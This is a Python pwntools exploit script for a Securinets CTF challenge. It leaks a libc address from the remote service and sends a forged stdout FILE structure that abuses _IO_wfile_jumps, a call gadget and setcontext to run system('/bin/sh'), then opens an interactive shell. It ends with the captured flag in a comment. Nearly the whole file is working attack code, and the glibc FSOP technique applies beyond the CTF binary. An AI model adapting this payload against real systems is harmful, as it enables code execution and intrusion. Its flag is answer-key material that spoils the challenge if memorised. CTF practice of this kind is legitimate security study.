#!/usr/bin/env python3

from pwn import *

# sometime its wont work (maybe because payload depend in libc address) -> retry until success

exe = ELF('./main_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
#b *_IO_flush_all
#b *_IO_flush_all+319
#b *_IO_flush_all+210
b *_IO_wdoallocbuf+35
'''

p = remote("pwn-14caf623.p1.securinets.tn", 9002)
#p = process('./main_patched')
#p = gdb.debug('./main_patched', gdbscript = script)
#debug()

rcu(b"stdout : ")
stdout = int(p.recvline(), 16)
libc_base = stdout - 0x1e85c0
lleak("libc_base", libc_base)

#system = libc_base + libc.symbols['system']
system = libc_base + 0x52c92 # skip push r13 ins to align stack
fake_vtable = libc_base + libc.symbols['_IO_wfile_jumps']
call_gadget = libc_base + 0x0000000000154722 # mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]
setcontext_gadget = libc_base + libc.symbols['setcontext'] + 87
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]

payload = b""
fileptr = stdout - 0x10
#payload += p64(0x3b01010101010101) # _flags (here is [stdout - 0x10], always be 0)
#payload += p64(0) will be &_IO_file_jumps after flush stderr
payload += p64(0x4141414141414141) # _IO_read_end
payload += p64(0) # it must be zero (idk why, fck gdb)
payload += p64(0) # _IO_write_base
payload += p64(1) # _IO_write_ptr
payload += p64(0) # it must be zero (idk why, fck gdb)
payload += p64(0) # it must be zero (idk why, fck gdb)
payload += p64(stdout + 0x38 - 0x20) # will be rdx after call gadget
payload += p64(setcontext_gadget) # will be [rdx + 0x20] to call when after call_gadget
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(call_gadget) # test
payload += p64(fileptr) # stdout's chain because we shift front payload 0x10  
payload += p64(0)
payload += p64(stdout + 0x1000) # _lock
payload += p64(binsh) # will be [rdx + 0x68] to call when setcontext -> rdi
payload += p64(stdout + 0x1008) # stdout's lock
payload += p64(fileptr) # _wide_data
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(system) # will be [rdx + 0xa8] to call when setcontext -> rcx -> rip
payload += p64(fake_vtable) # vtable
payload += p64(fileptr + 0x10 + 0x60 - 0x68) # _wide_data->vtable

s(payload)

p.interactive()
#Securinets{who_need_vtable_when_we_have_chain}